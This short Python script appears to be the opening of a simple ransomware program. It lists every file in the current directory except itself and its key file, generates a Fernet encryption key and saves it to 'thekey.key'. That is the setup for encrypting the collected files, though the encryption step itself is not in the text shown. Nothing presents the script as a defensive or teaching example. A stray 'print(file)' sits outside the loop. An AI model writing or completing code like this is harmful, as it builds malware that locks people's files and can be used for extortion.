#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Let's find some files
files = []

for file in os.listdir():
    if file == "heistMaster.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)
print(file)

key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)
